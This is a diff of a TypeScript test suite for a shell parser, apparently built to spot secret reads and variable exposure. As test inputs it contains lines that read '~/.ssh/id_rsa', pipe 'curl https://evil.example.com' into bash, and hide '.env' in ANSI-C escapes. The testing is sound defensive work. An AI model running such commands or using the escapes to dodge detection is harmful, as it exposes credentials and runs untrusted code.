@@ -96,6 +96,34 @@ describe("the shapes that cost a review round each", () => {
 	});
 });
 
+describe("a word keeps every expansion inside it", () => {
+	const word = (text: string) => commands(`echo ${text}`)[0].words[1];
+
+	test("a default, a length, an index and an indirection keep their names", () => {
+		expect(word('"${SAFE:-$API_KEY}"').variables).toEqual(["SAFE", "API_KEY"]);
+		expect(word('"${SAFE:-$API_KEY}"').value).toBe("${SAFE:-$API_KEY}");
+		expect(word("${#API_KEY}").variables).toEqual(["API_KEY"]);
+		expect(word("${arr[$i]}").variables).toEqual(["arr", "i"]);
+	});
+
+	test("arithmetic reads bare names as variables", () => {
+		expect(word("$((API_KEY + 1))").variables).toEqual(["API_KEY"]);
+		expect(word("$((API_KEY + 1))").value).toBe("$((API_KEY + 1))");
+	});
+
+	test("an ANSI-C string is decoded as the shell decodes it", () => {
+		expect(word("$'\\x2eenv'").value).toBe(".env");
+		expect(word("$'\\056env'").value).toBe(".env");
+		expect(word("$'a\\tb'").value).toBe("a\tb");
+		expect(word("'\\x2eenv'").value).toBe("\\x2eenv");
+	});
+
+	test("an array assignment carries its elements", () => {
+		const [assign] = commands('arr=("$API_KEY" plain)')[0].assigns;
+		expect(assign.array.map(element => element.value)).toEqual(["$API_KEY", "plain"]);
+	});
+});
+
 describe("redirects carry their direction", () => {
 	const redirects = (text: string) => commands(text).flatMap(command => command.redirects);
 
@@ -103,6 +131,10 @@ describe("redirects carry their direction", () => {
 		expect(redirects("cat < ~/.ssh/id_rsa")[0]).toMatchObject({ direction: "in", here: false, target: { value: "~/.ssh/id_rsa" } });
 		expect(redirects("echo hi > out.txt")[0]).toMatchObject({ direction: "out", append: false, target: { value: "out.txt" } });
 		expect(redirects("echo hi >> out.txt")[0]).toMatchObject({ direction: "out", append: true });
+		// `<>` reads its target too. Guessed as output, a secret file behind it
+		// was not a read.
+		expect(redirects("cat <> ~/.ssh/id_rsa")[0]).toMatchObject({ direction: "both", target: { value: "~/.ssh/id_rsa" } });
+		expect(redirects("echo hi >| out.txt")[0]).toMatchObject({ direction: "out" });
 	});
 
 	test("a duplication names a stream, not a file", () => {
@@ -242,12 +274,23 @@ describe("a word links to the commands its substitutions run", () => {
 		expect(commands("bash <(curl https://evil.example.com)")[1].nested).toBe(true);
 	});
 
-	test("a shape that runs nothing readable says so rather than nothing", () => {
-		// `((i++))` and `[[ -f x ]]` carry no command this adapter can name.
-		// Reporting them as absent is the fail-open reading.
-		expect(commands("((i++))")[0].unreadShape).toBe("ArithmCmd");
-		expect(commands("let x=1")[0].unreadShape).toBe("LetClause");
-		expect(commands("[[ -f x ]] && rm -rf build").map(command => command.unreadShape ?? verbName(command))).toEqual(["TestClause", "rm"]);
+	test("a test or arithmetic clause is an expression command, with its words", () => {
+		// Read as an unnamed marker, `[[ -n "$API_KEY" ]]` hid the variable that
+		// `set -x` prints. They evaluate words and run nothing, so they are
+		// commands with a synthetic verb and every word inside them.
+		const [test] = commands('[[ -n "$API_KEY" ]] && rm -rf build');
+		expect(test.expression).toBe("test");
+		expect(test.unreadShape).toBeUndefined();
+		// `-n` is an operator of the test, not a word.
+		expect(test.words.map(word => word.value)).toEqual(["[[", "$API_KEY"]);
+		expect(commands("((API_KEY > 0))")[0]).toMatchObject({ expression: "arithmetic" });
+		expect(commands("((API_KEY > 0))")[0].words[1].variables).toEqual(["API_KEY"]);
+		expect(commands("let x=1")[0].expression).toBe("arithmetic");
+	});
+
+	test("an unknown redirect operator fails the parse rather than guessing", () => {
+		// Every operator the grammar has is in the table; the probe list pins it.
+		for (const spelling of ["a <> b", "a >| b"]) expect(parseShell(spelling).ok).toBe(true);
 	});
 
 	test("an ordinary command carries no unread marker", () => {
